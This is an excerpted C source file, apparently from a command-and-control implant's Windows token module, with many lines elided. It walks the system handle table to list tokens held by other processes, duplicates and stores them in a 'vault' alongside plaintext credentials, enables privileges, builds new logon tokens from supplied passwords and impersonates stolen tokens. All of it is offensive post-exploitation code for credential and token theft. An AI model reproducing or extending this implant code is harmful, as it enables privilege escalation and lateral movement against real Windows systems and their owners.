 ...
 *
 * Token->Next            = ((INSTANCE *)Instance)->Tokens.Vault;
 * ((INSTANCE *)Instance)->Tokens.Vault = Token;
 *
...
BOOL TokenDuplicate(
    ...
    if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateToken( TokenOriginal, Access, &ObjAttr, FALSE, TokenType, TokenNew ) ) ) {
        ...
        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }
...
BOOL TokenQueryOwner(
    ...
    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationToken( Token, TokenUser, UserInfo, 0, &UserSize ) ) )
    {
        ...
        if ( ! ((INSTANCE *)Instance)->Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomnLen, &SidType ) )
        {
            SidType = 0;
            ...
            if ( ! ((INSTANCE *)Instance)->Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, User, &UserLen, Domain, &DomnLen, &SidType ) ) {
...
BOOL TokenSetPrivilege(
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) ) {
    ...
    if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken ) ) ) {
        if ( ! ((INSTANCE *)Instance)->Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) ) {
            PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
            return FALSE;
        }
    } else {
        PRINTF( "NtOpenProcessToken: Failed [%d]", ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) )
...
DWORD TokenAdd(
    ...
    TokenEntry              = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
    ...
    if ( ((INSTANCE *)Instance)->Tokens.Vault == NULL ) {
        ((INSTANCE *)Instance)->Tokens.Vault = TokenEntry;
        return TokenIndex;
    }

    TokenList = ((INSTANCE *)Instance)->Tokens.Vault;
...
BOOL TokenRemove( DWORD TokenID )
{
    ...
    if ( ((INSTANCE *)Instance)->Tokens.Vault == TokenItem )
    {
        PUTS( "Its first item" )
        TokenItem = ((INSTANCE *)Instance)->Tokens.Vault->NextToken;

        if ( ((INSTANCE *)Instance)->Tokens.Impersonate && ((INSTANCE *)Instance)->Tokens.Token->Handle == ((INSTANCE *)Instance)->Tokens.Vault->Handle )
            TokenImpersonate( FALSE );

        if ( ((INSTANCE *)Instance)->Tokens.Vault->Handle )
        {
            SysNtClose( ((INSTANCE *)Instance)->Tokens.Vault->Handle );
            ((INSTANCE *)Instance)->Tokens.Vault->Handle = NULL;
        }

        if ( ((INSTANCE *)Instance)->Tokens.Vault->DomainUser )
        {
            MemSet( ((INSTANCE *)Instance)->Tokens.Vault->DomainUser, 0, StringLengthW( ((INSTANCE *)Instance)->Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
            ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Tokens.Vault->DomainUser );
            ((INSTANCE *)Instance)->Tokens.Vault->DomainUser = NULL;
        }

        if ( ((INSTANCE *)Instance)->Tokens.Vault->lpUser )
        {
            MemSet( ((INSTANCE *)Instance)->Tokens.Vault->lpUser, 0, StringLengthW( ((INSTANCE *)Instance)->Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Tokens.Vault->lpUser );
            ((INSTANCE *)Instance)->Tokens.Vault->lpUser = NULL;
        }

        if ( ((INSTANCE *)Instance)->Tokens.Vault->lpDomain )
        {
            MemSet( ((INSTANCE *)Instance)->Tokens.Vault->lpDomain, 0, StringLengthW( ((INSTANCE *)Instance)->Tokens.Vault->lpDomain ) * sizeof( WCHAR ) );
            ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Tokens.Vault->lpDomain );
            ((INSTANCE *)Instance)->Tokens.Vault->lpDomain = NULL;
        }

        if ( ((INSTANCE *)Instance)->Tokens.Vault->lpPassword )
        {
            MemSet( ((INSTANCE *)Instance)->Tokens.Vault->lpPassword, 0, StringLengthW( ((INSTANCE *)Instance)->Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
            ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Tokens.Vault->lpPassword );
            ((INSTANCE *)Instance)->Tokens.Vault->lpPassword = NULL;
        }

        MemSet( ((INSTANCE *)Instance)->Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Tokens.Vault );

        ((INSTANCE *)Instance)->Tokens.Vault = TokenItem;
    ...
    do
    {
        if ( TokenList )
        {
            if ( TokenList->NextToken == TokenItem )
            {
                ...
                if ( ((INSTANCE *)Instance)->Tokens.Impersonate && ((INSTANCE *)Instance)->Tokens.Token->Handle == TokenItem->Handle )
                    TokenImpersonate( FALSE );
                ...
                if ( TokenItem->DomainUser )
                {
                    ...
                    ((INSTANCE *)Instance)->Win32.LocalFree( TokenItem->DomainUser );
                ...
                if ( TokenItem->lpUser )
                {
                    ...
                    ((INSTANCE *)Instance)->Win32.LocalFree( TokenItem->lpUser );
                ...
                if ( TokenItem->lpDomain )
                {
                    ...
                    ((INSTANCE *)Instance)->Win32.LocalFree( TokenItem->lpDomain );
                ...
                if ( TokenItem->lpPassword )
                {
                    ...
                    ((INSTANCE *)Instance)->Win32.LocalFree( TokenItem->lpPassword );
                    TokenItem->lpPassword = NULL;
                }

                MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
                ((INSTANCE *)Instance)->Win32.LocalFree( TokenItem );
                TokenItem = NULL;
...
HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain, DWORD LogonType )
{
    ...
    if ( ! ((INSTANCE *)Instance)->Win32.LogonUserW( User, Domain, Password, LogonType, LogonType == LOGON32_LOGON_NEW_CREDENTIALS ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT, &hToken ) )
    {
...
BOOL TokenImpersonate(
    ...
    if ( Impersonate && ! ((INSTANCE *)Instance)->Tokens.Impersonate && ((INSTANCE *)Instance)->Tokens.Token )
    {
        // impersonate the current token.
        ((INSTANCE *)Instance)->Tokens.Impersonate =  SysImpersonateLoggedOnUser( ((INSTANCE *)Instance)->Tokens.Token->Handle );
        return ((INSTANCE *)Instance)->Tokens.Impersonate;
    }
    else if ( ! Impersonate && ((INSTANCE *)Instance)->Tokens.Impersonate ) {
    {
        // stop impersonating
        ((INSTANCE *)Instance)->Tokens.Impersonate = FALSE;
        return TokenRevSelf();
    }
    } else if ( Impersonate && ! ((INSTANCE *)Instance)->Tokens.Token ) {
...
BOOL IsImpersonationToken( HANDLE token )
{
    ...
    TokenImpersonationInfo = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo )
        return FALSE;

    if ( ((INSTANCE *)Instance)->Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
    {
    ...
    if ( TokenImpersonationInfo )
        ((INSTANCE *)Instance)->Win32.LocalFree( TokenImpersonationInfo );
...
BOOL CanTokenBeImpersonated( IN HANDLE hToken )
{
    ...
    Success = ((INSTANCE *)Instance)->Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hImp );
...
BOOL QueryObjectTypesInfo( POBJECT_TYPES_INFORMATION* pObjectTypes, PULONG pObjectTypesSize )
{
    ...
    do
    {
        ...
        ObjTypeInformation = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, BufferLength );
    ...
    OUT PBUFFER UserDomain)
{
    ...
    ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenStatistics, NULL, 0, &returned_tokinfo_length );
    TokenStatisticsInformation = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, returned_tokinfo_length );

    if ( ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length ) )
    {
        // save the token type
        *pTokenType = TokenStatisticsInformation->TokenType;
        ...
        if ( TokenStatisticsInformation->TokenType == TokenPrimary )
        {
            ...
            ((INSTANCE *)Instance)->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize );
            TokenIntegrityInformation = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, cbSize );

            if ( ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenIntegrityLevel, TokenIntegrityInformation, cbSize, &cbSize ) )
            {
                *pIntegrity = *((INSTANCE *)Instance)->Win32.GetSidSubAuthority(TokenIntegrityInformation->Label.Sid, (DWORD)(UCHAR)(*((INSTANCE *)Instance)->Win32.GetSidSubAuthorityCount(TokenIntegrityInformation->Label.Sid) - 1));
                ReturnValue = TRUE;
            }
            else
            {
        ...
        else if (TokenStatisticsInformation->TokenType == TokenImpersonation)
        {
            ...
            ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length );
            TokenImpersonationInformation = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, returned_tokimp_length );

            if ( ((INSTANCE *)Instance)->Win32.GetTokenInformation( hToken, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length ) )
            {
...
BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInformation, OUT PPROCESS_LIST* pprocess_list )
{
    ...
    process_list = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof(PROCESS_LIST) );
...
BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG phandle_table_size )
{
    ...
    handleTableInformation = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, buffer_size );
...
BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )
{
    ...
    Tokens = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( USER_TOKEN_DATA ) );
    if ( ! Tokens )
        goto Cleanup;
    ...
    for ( ULONG i = 0; i < ProcessList->Count; i++ )
    {
        ...
        if ( ProcessId == ((INSTANCE *)Instance)->Session.PID )
            continue;
        if ( ProcessId == 0 )
            continue;
        if ( ProcessId == 4 )
...
BOOL SysImpersonateLoggedOnUser( HANDLE hToken )
{
    ...
    if ( ! NT_SUCCESS( Status ) )
    {
        PRINTF( "NtQueryInformationToken: Failed:[%08x : %ld]\n", Status, ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( Status ) );
        return FALSE;
    }
...
BOOL ImpersonateTokenInStore(
    ...
    if ( ((INSTANCE *)Instance)->Tokens.Impersonate && TokenData->Handle == ((INSTANCE *)Instance)->Tokens.Token->Handle ) {
        return TRUE;
    }
    ...
    if ( SysImpersonateLoggedOnUser( TokenData->Handle ) ) {
        ((INSTANCE *)Instance)->Tokens.Impersonate = TRUE;
        ((INSTANCE *)Instance)->Tokens.Token       = TokenData;
